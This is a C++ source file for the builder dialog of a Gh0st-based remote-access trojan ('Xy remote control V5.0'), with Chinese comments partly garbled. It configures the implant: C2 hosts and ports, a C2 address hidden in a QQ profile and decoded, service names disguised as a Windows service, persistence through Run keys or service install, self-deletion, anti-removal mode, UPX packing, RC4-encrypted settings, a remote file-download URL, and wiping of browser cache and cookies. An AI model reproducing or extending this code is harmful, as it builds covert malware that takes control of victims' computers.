// BuildServer.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "Build.h"
#include "MyToolsKit.h"
#include "UpdateDlg.h"
#include "Gh0stView.h"
#include "BulidServer.h"

#import "msxml3.dll"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

char patht[MAX_PATH];
/////////////////////////////////////////////////////////////////////////////
// CBuildServer dialog
extern CGh0stView* g_pTabView;

CBuild::CBuild(CWnd* pParent /*=NULL*/)
    : CDialog(CBuild::IDD, pParent)
{
    //{{AFX_DATA_INIT(CBuildServer)
    m_remote_host1 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Host1", "127.0.0.1");  //����IP(1)����
    m_remote_host2 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Host2", "�ͷ�QQ��826338442");  //����IP(2)����
    m_remote_port1 =((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8000);              //���߶˿� 1
    m_remote_port2 =((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8000);              //���߶˿� 2
    m_remote_name = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Group", "Default");   //���߷���
    m_strVersion = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Version", "V5.0");   //����汾
    m_ServiceName = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������","ServiceName","SSDKSRV");  //��������
    m_ServiceDisplayName = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������","ServiceDisplayName","SSDKSRV Discovery Service");  //������ʾ
    m_ServiceDescription = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������","ServiceDescription","��������ͥ�����ϵ� Booth �豸�ļ�⡣");  //��������
    m_delrtd = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Delrtd",0);   //��ɾ��
    m_zrAzst = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","ZAzst",0);       //д�밲װ����
    if(m_zrAzst == 0) {
        m_zraz = 1;
        m_zraz1 = 0;
        m_zraz2 = 0;
    }

    else if(m_zrAzst == 1) {
        m_zraz1 = 1;
        m_zraz = 0;
        m_zraz2 = 0;
    }

    else if(m_zrAzst == 2) {
        m_zraz2 = 1;
        m_zraz1 = 0;
        m_zraz = 0;
    }

    m_zkfkzj = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Kzjizms",0);   //K�ս���ģʽ
    m_upx = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Upx",0);         //upxѹ��
    m_zkfsms = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Zkfsms",0);   //ռ�ӷ�ɾ��ģʽ
    m_gdtj = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Gdtj",1);         //���;���̶�
    m_meux = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Meux",1);         //�������
    m_azzds = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Azzds",0);      //��װ����
    m_exemeux = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "Exemeux", "FUCK YOU");      //���л���
    m_dllname = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("��������", "DllName", "Terms");   //��װ����
    m_edit_kb = _T("http://www.baidu.com/1.jpg");
    m_kbcheck = FALSE;
    m_baocun = TRUE;
    m_changurl = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("��������","Changurl",0);   //����ת��
    //}}AFX_DATA_INIT
}


void CBuild::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    //{{AFX_DATA_MAP(CBuildServer)
    DDX_Control(pDX, IDC_ZS_BUILD, m_zs_build);
    DDX_Control(pDX, IDC_ZC_BUILD, m_zc_build);
    DDX_Control(pDX, IDC_ICONS, m_Ico);
    DDX_Control(pDX, IDC_GROUP, m_group_name);
    DDX_Control(pDX, IDC_EDIT_BUILDLOG, m_log);
    DDX_Control(pDX, IDC_COMBO_RELEASEPATH, m_remote_path);
    DDX_Control(pDX, IDC_FILEATTRIBUTE, m_fileattribute);
    DDX_Control(pDX, IDC_FILEALEIXING, m_filealeixing);
    DDX_Control(pDX, IDC_TEST_MASTER2, m_testBtn2);
    DDX_Control(pDX, IDC_TEST_MASTER1, m_testBtn1);
    DDX_Text(pDX, IDC_COMBO_RELEASEPATH, m_releasepath);
    DDX_Text(pDX, IDC_FILEALEIXING, m_houzuiming);
    DDX_Text(pDX, IDC_REMOTE_HOST1, m_remote_host1);
    DDX_Text(pDX, IDC_REMOTE_HOST2, m_remote_host2);
    DDX_Text(pDX, IDC_REMOTE_PORT1, m_remote_port1);
    DDX_Text(pDX, IDC_REMOTE_PORT2, m_remote_port2);
    DDX_CBString(pDX, IDC_GROUP, m_remote_name);
    DDX_Text(pDX, IDC_VERSION, m_strVersion);
    DDX_Text(pDX, IDC_SERVICE_NAME, m_ServiceName);
    DDX_Text(pDX, IDC_SERVICE_DISPLAY, m_ServiceDisplayName);
    DDX_Text(pDX, IDC_SERVICE_DESCRIP, m_ServiceDescription);
    DDX_Check(pDX, IDC_DELRTD, m_delrtd);   //��ɾ��
    DDX_Check(pDX, IDC_ZRAZ, m_zraz);   //��ɫ��װ
    DDX_Check(pDX, IDC_ZRAZ1, m_zraz1);   //Run������װ
    DDX_Check(pDX, IDC_ZRAZ2, m_zraz2);   //����������װ
    DDX_Check(pDX, IDC_ZKFKZJ, m_zkfkzj);
    DDX_Check(pDX, IDC_UPX, m_upx);
    DDX_Check(pDX, IDC_ZKFSMS, m_zkfsms);
    DDX_Check(pDX, IDC_GDTJ, m_gdtj);
    DDX_Check(pDX, IDC_MEUX, m_meux);
    DDX_Text(pDX, IDC_AZZDS, m_azzds);
    DDX_Text(pDX, IDC_EXE_MEUX, m_exemeux);
    DDX_Text(pDX, IDC_DLL_NAME, m_dllname);
    DDX_Text(pDX, IDC_EDIT_KB, m_edit_kb);
    DDX_Check(pDX, IDC_KBCHECK, m_kbcheck);
    DDX_Check(pDX, IDC_BAOCUN, m_baocun);
    DDX_Check(pDX, IDC_CHANGURL, m_changurl);
    //}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuild, CDialog)
    //{{AFX_MSG_MAP(CBuildServer)
    ON_BN_CLICKED(IDC_TEST_MASTER1, OnTestMaster1)
    ON_BN_CLICKED(IDC_TEST_MASTER2, OnTestMaster2)
    ON_BN_CLICKED(IDC_ZRAZ, OnZraz)
    ON_BN_CLICKED(IDC_ZRAZ1, OnZraz1)
    ON_BN_CLICKED(IDC_ZRAZ2, OnZraz2)
    ON_BN_CLICKED(IDC_GDTJ, OnGdtj)
    ON_BN_CLICKED(IDC_MEUX, OnMeux)
    ON_BN_CLICKED(IDC_ICONS, OnSelectIco)
    ON_BN_CLICKED(IDC_KBTEST, OnKbtest)
    ON_BN_CLICKED(IDC_KBCHECK, OnKbcheck)
    ON_WM_CTLCOLOR()
    ON_BN_CLICKED(IDC_EXIT, OnExit)
    ON_BN_CLICKED(IDC_RANDOM, OnRandom)
    ON_BN_CLICKED(IDC_BUILD, OnBuild)
    ON_BN_CLICKED(IDC_HUOQU_ZP, OnHuoquZp)
    ON_BN_CLICKED(IDC_HUOQU_CP, OnHuoquCp)
    ON_BN_CLICKED(IDC_ZS_BUILD, OnZsBuild)
    ON_BN_CLICKED(IDC_ZC_BUILD, OnZcBuild)
    //}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildServer message handlers

VOID CBuild::MyEncryptFunctionForServer(LPSTR szData,WORD Size)
{
    CUpdateDlg Dig;
    //RC4 ���� ����  Mother360
    unsigned char m_strkey0[256];
    char bpackey_se[] = {'K','o','t','h','e','r','1','6','8','\0'};
    Dig.rc4_init(m_strkey0,(unsigned char*)bpackey_se, sizeof(bpackey_se));  //��ʼ�� RC4����
    Dig.rc4_crypt(m_strkey0,(unsigned char *)szData,Size);
}


BOOL CBuild::OnInitDialog()
{
    CDialog::OnInitDialog();

// 	SetIcon(AfxGetApp()->LoadIcon(IDI_CREATE),FALSE);
// 	SetIcon(AfxGetApp()->LoadIcon(IDI_CREATE),TRUE);

    UpdateData(false);

    OnzrppccAz();

    CString strGroupName, strTemp;
    int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
    int i=0;
    for ( i = 0; i < nTabs; i++ ) {
        strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
        int n = strTemp.ReverseFind('(');
        if ( n > 0 ) {
            strGroupName = strTemp.Left(n);
        } else {
            strGroupName = strTemp;
        }
        m_group_name.AddString(strGroupName);
    }

    m_fileattribute.SetCurSel(5);
    m_filealeixing.SetCurSel(4);
    m_remote_path.SetCurSel(1);

    m_log.ReplaceSel("          ��ӭʹ��XyԶ��Э��������� V5.0 \r\n\r\n\r\n");
    m_log.ReplaceSel("=> ������������ü��δ������Ů�������\r\n");
    m_log.ReplaceSel("=> �������ڷǷ���;��\r\n");
    m_log.ReplaceSel("=> ʹ�ñ�����������������������޹�\r\n");
    m_log.ReplaceSel("=> �������ɳ������ڳ�ʼ��...\r\n");
    char DatPath[MAX_PATH];
    GetModuleFileName( NULL, DatPath, sizeof(DatPath) );
    *strrchr( DatPath, '\\' ) = '\0';
    lstrcat( DatPath, "\\Dat\\Server.dat" );

    if ( GetFileAttributes(DatPath) == -1  ) {
        m_log.ReplaceSel( "=> û���ҵ�Dat�ļ����޷����ɷ����\r\n");
        m_log.ReplaceSel( "=> ����Dat�ļ� �Ƿ����\r\n");
        GetDlgItem(IDC_BUILD)->EnableWindow(FALSE);
    } else
        m_log.ReplaceSel( "=> ׼�������������ɷ����\r\n");

    //������ʾ����
    CString restr;
    restr= "Ŀ����(1)��ֱ����������IP��";
    m_tooltip.Create(this);
    m_tooltip.AddTool(GetDlgItem(IDC_REMOTE_HOST1),restr);

    restr= "�˿�����д������IP���Ӷ˿ڡ�";
    m_tooltip.AddTool(GetDlgItem(IDC_REMOTE_PORT1),restr);

    restr= "Ŀ������ֱ��������QQ���룬\n����ģʽΪQQ�ǳ����ߣ�\n��д��ʽ��###127.0.0.1***  ";
//	restr= "Ŀ����(2)��ֱ����д�������QQ���롣";
    m_tooltip.AddTool(GetDlgItem(IDC_REMOTE_HOST2),restr);

    restr= "�˿�����дQQ�������Ӷ˿ڡ�";
    m_tooltip.AddTool(GetDlgItem(IDC_REMOTE_PORT2),restr);

    restr= "��������д�������ơ�";
    m_tooltip.AddTool(GetDlgItem(IDC_SERVICE_NAME),restr);

    restr= "��������д������ʾ��";
    m_tooltip.AddTool(GetDlgItem(IDC_SERVICE_DISPLAY),restr);

    restr= "��������д����������";
    m_tooltip.AddTool(GetDlgItem(IDC_SERVICE_DESCRIP),restr);

    restr= "��ɫ��װ��һ�������У�����������ģʽ��";
    m_tooltip.AddTool(GetDlgItem(IDC_ZRAZ),restr);

    restr= "Run������װ���û���¼��������С�";
    m_tooltip.AddTool(GetDlgItem(IDC_ZRAZ1),restr);

    restr= "����������װ��������ϵͳ���������С�";
    m_tooltip.AddTool(GetDlgItem(IDC_ZRAZ2),restr);

    restr= "��װ��ѡȡ����д����װ;����";
    m_tooltip.AddTool(GetDlgItem(IDC_COMBO_RELEASEPATH),restr);

    restr= "��װ����д����װ���ơ�";
    m_tooltip.AddTool(GetDlgItem(IDC_DLL_NAME),restr);

    restr= "��װ����д����װ��������ֵ��0Ϊ�����󣩣���λ��MB����";
    m_tooltip.AddTool(GetDlgItem(IDC_AZZDS),restr);

    restr= "�㡰�������������װ;�����ѡȡ��";
    m_tooltip.AddTool(GetDlgItem(IDC_GDTJ),restr);

    restr= "����װ�ɹ����Զ�ɾ����";
    m_tooltip.AddTool(GetDlgItem(IDC_DELRTD),restr);

    restr= "��������д�������л�����Ϣ��\n��ֹ����˳����ΰ�װ���С�";
    m_tooltip.AddTool(GetDlgItem(IDC_EXE_MEUX),restr);

    restr= "��������д�������汾��Ϣ��\n������ʾ����˰汾��";
    m_tooltip.AddTool(GetDlgItem(IDC_VERSION),restr);

    restr= "������ѡȡ����д���߷�����Ϣ��\n����ʱ�Է���˽��з�����ࡣ";
    m_tooltip.AddTool(GetDlgItem(IDC_GROUP),restr);

    restr= "�㡰��������������л������ѡȡ��";
    m_tooltip.AddTool(GetDlgItem(IDC_MEUX),restr);

    restr= "�������߼�¼��������ʾ���߼�¼����";
    m_tooltip.AddTool(GetDlgItem(IDC_ZKFKZJ),restr);

    restr= "������ɾ��ģʽ����ֹ���˶���ɾ������";
    m_tooltip.AddTool(GetDlgItem(IDC_ZKFSMS),restr);

    restr= "��������ɺ�UPXģʽѹ������С����˳��������";
    m_tooltip.AddTool(GetDlgItem(IDC_UPX),restr);

    restr= "ѡȡ��������ɺ�ͼ�ꡣ";
    m_tooltip.AddTool(GetDlgItem(IDC_ICONS),restr);

    restr= "ѡ������ת�����ߣ���Ҫ��ɱ���������أ�\n������������Բ�";
    m_tooltip.AddTool(GetDlgItem(IDC_CHANGURL),restr);

    restr= "ѡ�������ļ��������з�������������ļ���";
    m_tooltip.AddTool(GetDlgItem(IDC_KBCHECK),restr);

    restr= "���������ļ���ַ\n���磺http://www.baidu.com/sb360.jpg����";
    m_tooltip.AddTool(GetDlgItem(IDC_EDIT_KB),restr);


    return TRUE;  // return TRUE unless you set the focus to a control
    // EXCEPTION: OCX Property Pages should return FALSE
}



void CBuild::OnTestMaster1()
{
    // TODO: Add your control notification handler code here
    UpdateData();

    if (!m_remote_host1.GetLength() || !m_remote_port1) {
        MessageBox("��������д����/IP(1)������Ϣ...","��ʾ...", MB_ICONINFORMATION);
        return;
    }

    m_testBtn1.EnableWindow(FALSE);
    // 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster1, this, 0, NULL);
    TestMaster1();
}

void CBuild::OnTestMaster2()
{
    // TODO: Add your control notification handler code here
    UpdateData();

    if (!m_remote_host2.GetLength() || !m_remote_port2) {
        //		MessageBox("��������дQQ�ռ�(2)������Ϣ......","��ʾ...", MB_ICONINFORMATION);
        MessageBox("��������дQQ����(2)������Ϣ...","��ʾ...", MB_ICONINFORMATION);
        return;
    }
    //	HANDLE	hThread;
    m_testBtn2.EnableWindow(FALSE);

    //	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster2, this, 0, NULL);
    TestMaster2();

//	CloseHandle(hThread);
}

/////////////////////////////////////////////////////////////////////////////////////////////////


enum DEL_CACHE_TYPE { //Ҫɾ�������͡�
    File,//��ʾinternet��ʱ�ļ�
    Cookie //��ʾCookie
};

#define SWEEP_BUFFER_SIZE			10000



BOOL WipeFile(LPCTSTR szDir, LPCTSTR szFile)
{
    CString sPath;
    HANDLE	hFile;
    DWORD	dwSize;
    DWORD	dwWrite;
    char	sZero[SWEEP_BUFFER_SIZE];
    memset(sZero, 0, SWEEP_BUFFER_SIZE);

    sPath = szDir;
    sPath += _T('\\');
    sPath += szFile;

    hFile = CreateFile(sPath, GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    dwSize = GetFileSize(hFile, NULL);

    //skip file header (actually, I don't know the file format of index.dat)
    dwSize -= 64;
    SetFilePointer(hFile, 64, NULL, FILE_BEGIN);

    while (dwSize > 0) {
        if (dwSize > SWEEP_BUFFER_SIZE) {
            WriteFile(hFile, sZero, SWEEP_BUFFER_SIZE, &dwWrite, NULL);
            dwSize -= SWEEP_BUFFER_SIZE;
        } else {
            WriteFile(hFile, sZero, dwSize, &dwWrite, NULL);
            break;
        }
    }

    CloseHandle(hFile);
    return TRUE;
}
BOOL EmptyDirectory(LPCTSTR szPath, BOOL bDeleteDesktopIni = FALSE,   BOOL bWipeIndexDat = FALSE);

BOOL EmptyDirectory(LPCTSTR szPath, BOOL bDeleteDesktopIni,
                    BOOL bWipeIndexDat)
{
    WIN32_FIND_DATA wfd;
    HANDLE hFind;
    CString sFullPath;
    CString sFindFilter;
    DWORD dwAttributes = 0;

    sFindFilter = szPath;
    sFindFilter += _T("\\*.*");
    if ((hFind = FindFirstFile(sFindFilter, &wfd)) == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        if (_tcscmp(wfd.cFileName, _T(".")) == 0 ||
            _tcscmp(wfd.cFileName, _T("..")) == 0 ||
            (bDeleteDesktopIni == FALSE && _tcsicmp(wfd.cFileName, _T("desktop.ini")) == 0)) {
            continue;
        }

        sFullPath = szPath;
        sFullPath += _T('\\');
        sFullPath += wfd.cFileName;

        //ȥ��ֻ������
        dwAttributes = GetFileAttributes(sFullPath);
        if (dwAttributes & FILE_ATTRIBUTE_READONLY) {
            dwAttributes &= ~FILE_ATTRIBUTE_READONLY;
            SetFileAttributes(sFullPath, dwAttributes);
        }

        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EmptyDirectory(sFullPath, bDeleteDesktopIni, bWipeIndexDat);
            RemoveDirectory(sFullPath);
        } else {
            if (bWipeIndexDat && _tcsicmp(wfd.cFileName, _T("index.dat")) == 0) {
                WipeFile(szPath, wfd.cFileName);
            }
            DeleteFile(sFullPath);
        }
    } while (FindNextFile(hFind, &wfd));
    FindClose(hFind);

    return TRUE;
}
BOOL DeleteUrlCache(DEL_CACHE_TYPE type)
{
    BOOL bRet = FALSE;
    HANDLE hEntry;
    LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;
    DWORD dwEntrySize;

    //delete the files
    dwEntrySize = 0;
    hEntry = FindFirstUrlCacheEntry(NULL, NULL, &dwEntrySize);
    lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwEntrySize];
    hEntry = FindFirstUrlCacheEntry(NULL, lpCacheEntry, &dwEntrySize);
    if (!hEntry) {
        goto cleanup;
    }

    do {
        if (type == File &&
            !(lpCacheEntry->CacheEntryType & COOKIE_CACHE_ENTRY)) {
            DeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
        } else if (type == Cookie &&
                   (lpCacheEntry->CacheEntryType & COOKIE_CACHE_ENTRY)) {
            DeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
        }

        dwEntrySize = 0;
        FindNextUrlCacheEntry(hEntry, NULL, &dwEntrySize);
        delete [] lpCacheEntry;
        lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwEntrySize];
    } while (FindNextUrlCacheEntry(hEntry, lpCacheEntry, &dwEntrySize));

    bRet = TRUE;
cleanup:
    if (lpCacheEntry) {
        delete [] lpCacheEntry;
    }
    return bRet;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int IPorUrl(char *ipaddr)//�ж���IP��������
{
    char *pnum,*pdot=ipaddr;
    for(; *ipaddr; ipaddr=pdot++) {
        int t=0,e=1;
        if(*(pnum=pdot)=='.')return 0;
        for(; *pdot!='.'&&*pdot; ++pdot);
        for(ipaddr=pdot-1; ipaddr>=pnum; t+=e*(*ipaddr---'0'),e*=10);
        if(t<0||t>255||(pdot-pnum==3&&t<100)||(pdot-pnum==2&&t<10))
            return 0;
    }
    return 1;
}

char* UrlToIP(LPCSTR ch)
{


    // //��internet��ʱ�ļ�
    char szPath[MAX_PATH];
    DeleteUrlCache(File);
    if (SHGetSpecialFolderPath(NULL, szPath, CSIDL_INTERNET_CACHE, FALSE)) {
        //�õ���ʱĿ¼���������.
        EmptyDirectory(szPath);
    }
    if (lstrlen(ch) == 0) {
        return NULL;
    }
    if (IPorUrl((char*)ch)) {
        return (char*)ch;
    }

    char lpurl[MAX_PATH] = {0};
    char *cSrvName= "ip.cn";
    struct sockaddr_in srv_addr;

    SOCKET cli_sock=socket(PF_INET,SOCK_STREAM,0);
    if (cli_sock==INVALID_SOCKET)
        return NULL;// connect to server

    srv_addr.sin_family= AF_INET;

    LPHOSTENT lphost= gethostbyname(cSrvName);
    if (lphost!= NULL)
        srv_addr.sin_addr.s_addr= ((LPIN_ADDR)lphost->h_addr)->s_addr;

    srv_addr.sin_port= htons(80);

    if (connect(cli_sock,(LPSOCKADDR)&srv_addr,sizeof(srv_addr))==SOCKET_ERROR)
        return NULL;

    wsprintfA(lpurl,"GET /index.php?ip=%s HTTP/1.1\n"
                    "Host: ip.cn\n"
                    "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg\n"
                    "Accept-Language: zh-cn\n"
                    "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; );\n\n\n"
              ,ch);

    int  retval = send(cli_sock,lpurl,sizeof(lpurl)-1,0);

    if( SOCKET_ERROR == retval )
        return NULL;

    char buffer[1000];
    char *ip_start = NULL;

    for(;;) {
        memset(buffer,0,sizeof(buffer));
        retval= recv(cli_sock,buffer,sizeof(buffer),0);

        if (retval <= 0)
            break;

        if(strstr(buffer,"<code>")!= 0) {
            char *ip_stop=strstr(buffer,"</code>");//IP��β��ָ�븳ֵ
            *ip_stop='\0';//�ض�

            ip_start=strstr(buffer,"e>")+2;//ip�ο�ʼ����ָ�븳ֵ
            break;
        }
    }

    closesocket(cli_sock);

    return ip_start;
}

void CBuild::TestMaster1()
{
    // TODO: Add your control notification handler code here
//	BuildServer	*pThis = (BuildServer *)lparam;
    CString	strResult;
    CString	strResulr = "����ʧ��... ";
    bool	bRet = true;
    WSADATA	wsaData0;
    WSAStartup(0x0201, &wsaData0);

    SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sRemote == SOCKET_ERROR) {
        MessageBox("����/IP(1)����-��ʼ��ʧ��... ","��ʾ...", MB_ICONWARNING);
        return ;
    }
    // ����socketΪ������
    u_long argp	= 1;
    ioctlsocket(sRemote, FIONBIO, &argp);

    struct timeval tvSelect_Time_Out;
    tvSelect_Time_Out.tv_sec = 3;
    tvSelect_Time_Out.tv_usec = 0;

    hostent* pHostent = NULL;
    pHostent = gethostbyname(m_remote_host1);
    if (pHostent == NULL) {
        bRet = false;
        goto fail;
    }

    // ����sockaddr_in�ṹ
    sockaddr_in	ClientAddr;
    memset(&ClientAddr,0,sizeof(ClientAddr));
    ClientAddr.sin_family	= AF_INET;
    ClientAddr.sin_port	= htons(m_remote_port1);

    ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

    connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));

    fd_set	fdWrite;
    FD_ZERO(&fdWrite);
    FD_SET(sRemote, &fdWrite);

    if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0) {
        bRet = false;
        goto fail;
    }

fail:

    strResult.Format("����/IP(1)������Ϣ: \n���� IP��%s  \n���Ӷ˿�: %d ",UrlToIP(m_remote_host1),m_remote_port1);
    if (bRet)
        strResulr = "���ӳɹ�... ";

    MessageBox(strResult,strResulr,MB_ICONINFORMATION);
    m_testBtn1.EnableWindow(true);//�ȴ�������ɵ�ʱ��ż��ť�������ε������������

    return ;
}




char ipExcp[30]= {0};
char lpszQQ[30]= {0};
BOOL qqonline(LPCTSTR str)
{
    ///////////////////////////////����ip�Ļ�ȡ//////////////////////////////////////

    using namespace MSXML2;//ʹ��msxml2�����ռ�
    CoInitialize(NULL);//��ʼ��com�齨

    // //��internet��ʱ�ļ�
    char szPath[MAX_PATH];
    DeleteUrlCache(File);
    if (SHGetSpecialFolderPath(NULL, szPath, CSIDL_INTERNET_CACHE, FALSE)) {
        //�õ���ʱĿ¼���������.
        EmptyDirectory(szPath);
    }

    try {
        IXMLHTTPRequestPtr xmlrequest;// ����һ��IXMLHTTPRequestPtr����ָ��
        xmlrequest.CreateInstance("Msxml2.XMLHTTP");//���齨�еõ�����Ľ��,�齨Ҳ���൱��һ������,�����ṩ�˺ܶ�����,����ֻҪ������Ҫ�Ľӿ������ܻ���ĸ�����
        _variant_t varp(false);
        char abc[MAX_PATH]= {0};
        wsprintf (abc, "http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=%s",str);
// 		char abc[50]="http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=";
// 		strcat(abc,str);
        xmlrequest->open(_bstr_t("GET"),_bstr_t(abc),varp);// ��ʼ���������͵�ͷ����Ϣ
        xmlrequest->send(); // ���͵�������
        BSTR bstrbody;
        xmlrequest->get_responseText(&bstrbody);// ��÷������ķ�����Ϣ
        _bstr_t bstrtbody(bstrbody);// ��bstrbodyǿ��ת����_bstr_t���͵�����
        char	chBuff1[300*1024];    //��ȡ��������
        strcpy(chBuff1,(LPCTSTR)bstrtbody);
        SysFreeString((BSTR)bstrbody);//�ͷ��ַ���

        char BvtmX15[] = {'#','#','#','\0'};
        char BvtmX16[] = {'*','*','*','\0'};
        CUpdateDlg Dig;
        DWORD SizePoint = Dig.memfind(chBuff1,BvtmX15,sizeof(chBuff1),0)+4;
        DWORD SizePoinr = Dig.memfind(chBuff1,BvtmX16,sizeof(chBuff1),0)+1;

        DWORD SizePoine = 0;
        if(SizePoinr>SizePoint) {
            SizePoine = SizePoinr - SizePoint;
            Dig.substr(chBuff1,SizePoint,SizePoine);
            strcpy(lpszQQ,chBuff1);
            int arr[10][15]= {'s','t','u','v','w','x','y','z','a','b','c','d','e','f','g','t','u','v','w','x','y','z','a','b','c','d','e','f','g','h','u','v','w','x','y','z','a','b','c','d','e','f','g','h','i','v','w','x','y','z','a','b','c','d','e','f','g','h','i','j','w','x','y','z','a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z','a','n','o','p','q','r','s','t','u','v','w','x','y','z','a','b','o','p','q','r','s','t','u','v','w','x','y','z','a','b','c','p','q','r','s','t','u','v','w','x','y','z','a','b','c','d','q','r','s','t','u','v','w','x','y','z','a','b','c','d','e'};
            int D[15]= {'r','s','t','u','v','w','x','y','z','a','b','c','d','e','f'};
            char *ipExcp=new char[strlen(lpszQQ)];
            strcpy(ipExcp,lpszQQ);
            for (int y=0; y<strlen(ipExcp); y++) {
                if (ipExcp[y] == D[y]) {
                    ipExcp[y] = '.';
                } else {
                    for (int z=0; z<10; z++) {
                        if (ipExcp[y] == arr[z][y]) {
                            ipExcp[y] = '0'+z;
                            break;
                        }
                    }
                }
            }
            strcpy(lpszQQ,ipExcp);
        } else
            strcpy(lpszQQ,"��ȡʧ��... ");

    } catch(...) {
    }
    CoUninitialize();//����ʼ��com�齨��

    return true;
}


void CBuild::TestMaster2()
{
    // TODO: Add your control notification handler code here
    //	BuildServer	*pThis = (BuildServer *)lparam;
    CString	strResult;
    CString	strResulr = "����ʧ��... ";
    bool	bRet = true;
    WSADATA	wsaData0;
    WSAStartup(0x0201, &wsaData0);

    SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sRemote == SOCKET_ERROR) {
        MessageBox("QQ����-��ʼ��ʧ��","��ʾ", MB_ICONWARNING);
        return ;
    }
    // ����socketΪ������
    u_long argp	= 1;
    ioctlsocket(sRemote, FIONBIO, &argp);

    struct timeval tvSelect_Time_Out;
    tvSelect_Time_Out.tv_sec = 3;
    tvSelect_Time_Out.tv_usec = 0;

    hostent* pHostent = NULL;

    qqonline(m_remote_host2);   //QQ����IP��ȡ
    if(lpszQQ == NULL) {
        bRet = false;
        goto fail;
    }
    pHostent = gethostbyname(lpszQQ);
    if (pHostent == NULL) {
        bRet = false;
        goto fail;
    }

    // ����sockaddr_in�ṹ
    sockaddr_in	ClientAddr;
    memset(&ClientAddr,0,sizeof(ClientAddr));
    ClientAddr.sin_family	= AF_INET;
    ClientAddr.sin_port	= htons(m_remote_port2);

    ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

    connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));

    fd_set	fdWrite;
    FD_ZERO(&fdWrite);
    FD_SET(sRemote, &fdWrite);

    if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0) {
        bRet = false;
        goto fail;
    }

fail:
    strResult.Format("QQ����(2)������Ϣ: \n���� IP��%s  \n���Ӷ˿�: %d ",lpszQQ,m_remote_port2);
    if (bRet)
        strResulr = "���ӳɹ�... ";

    MessageBox(strResult,strResulr,MB_ICONINFORMATION);
    m_testBtn2.EnableWindow(true);//�ȴ�������ɵ�ʱ��ż��ť�������ε������������

    return ;
}

BOOL CBuild::PreTranslateMessage(MSG* pMsg)
{

    if(pMsg->message   ==   WM_KEYDOWN) {
        switch(pMsg->wParam) {
        case   VK_RETURN://���λس�
            return   TRUE;
        case   VK_ESCAPE://����Esc
            return   TRUE;
        }
    }

    m_tooltip.RelayEvent(pMsg);
    return CDialog::PreTranslateMessage(pMsg);
}


void CBuild::OnzrppccAz()
{


    BOOL Azlx,Azlx1;

    UpdateData(true);

    if(m_zraz == TRUE)
        Azlx = NULL;
    else
        Azlx = TRUE;

    if(m_zraz2 != TRUE)
        Azlx1 = NULL;
    else
        Azlx1 = TRUE;

    GetDlgItem(IDC_DELRTD)->EnableWindow(Azlx);
    GetDlgItem(IDC_AZZDS)->EnableWindow(Azlx);
    GetDlgItem(IDC_ZKFSMS)->EnableWindow(Azlx);
    GetDlgItem(IDC_GDTJ)->EnableWindow(Azlx);

    GetDlgItem(IDC_SERVICE_DISPLAY)->EnableWindow(Azlx1);
    GetDlgItem(IDC_SERVICE_DESCRIP)->EnableWindow(Azlx1);

    GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(Azlx);
    GetDlgItem(IDC_DLL_NAME)->EnableWindow(Azlx);
